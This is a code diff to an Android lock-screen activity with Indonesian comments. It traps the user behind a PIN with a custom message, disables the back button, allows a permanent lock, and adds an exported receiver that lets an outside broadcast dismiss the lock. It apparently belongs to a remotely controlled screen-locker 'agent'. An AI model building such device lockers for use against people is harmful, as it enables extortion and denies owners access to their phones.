@@ -1,29 +1,43 @@
 package com.ezax.agent;
 
 import android.app.Activity;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.os.Bundle;
 import android.os.CountDownTimer;
-import android.widget.Button;
 import android.widget.TextView;
 
 public class LockScreenActivity extends Activity {
 
     private TextView tvPesan, tvTimer, tvPinDisplay;
     private StringBuilder inputPin = new StringBuilder();
-    private String correctPin = "1234"; // Default
+    private String correctPin = "1234"; 
     private long timerDuration = 0;
     private CountDownTimer countDownTimer;
+
+    // --- RECEIVER BUAT NANGKEP SINYAL UNPIN ---
+    private BroadcastReceiver unlockReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            if (countDownTimer != null) countDownTimer.cancel();
+            finish(); // Tutup layar kunci
+        }
+    };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_lock);
 
+        // Daftarin receiver-nya
+        registerReceiver(unlockReceiver, new IntentFilter("UNLOCK_SCREEN_ACTION"), Context.RECEIVER_EXPORTED);
+
         tvPesan = findViewById(R.id.tv_pesan);
         tvTimer = findViewById(R.id.tv_timer);
         tvPinDisplay = findViewById(R.id.tv_pin_display);
 
-        // Ambil data dari MainActivity
         if (getIntent().hasExtra("PESAN")) tvPesan.setText(getIntent().getStringExtra("PESAN"));
         if (getIntent().hasExtra("PIN")) correctPin = getIntent().getStringExtra("PIN");
         if (getIntent().hasExtra("TIMER")) timerDuration = getIntent().getLongExtra("TIMER", 0);
@@ -62,14 +76,11 @@ public class LockScreenActivity extends Activity {
     private void checkPin() {
         if (inputPin.length() == correctPin.length()) {
             if (inputPin.toString().equals(correctPin)) {
-                // PIN Benar
                 if (countDownTimer != null) countDownTimer.cancel();
-                finish(); // Tutup layar kunci
+                finish(); 
             } else {
-                // PIN Salah (Sesuai request: biasa aja)
                 inputPin.setLength(0);
                 updatePinDisplay();
-                // Opsional: getar dikit
             }
         }
     }
@@ -87,23 +98,22 @@ public class LockScreenActivity extends Activity {
 
                 @Override
                 public void onFinish() {
-                    finish(); // Timer habis, buka layar
+                    finish(); 
                 }
             }.start();
         } else {
-            // Permanen
             tvTimer.setText("DIBUKA DALAM : PERMANEN");
         }
     }
 
     @Override
-    public void onBackPressed() {
-        // Sengaja dikosongin biar gak bisa keluar pake tombol back
-    }
+    public void onBackPressed() { }
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
         if (countDownTimer != null) countDownTimer.cancel();
+        // Jangan lupa unregister receiver biar gak bocor memorinya
+        unregisterReceiver(unlockReceiver); 
     }
 }
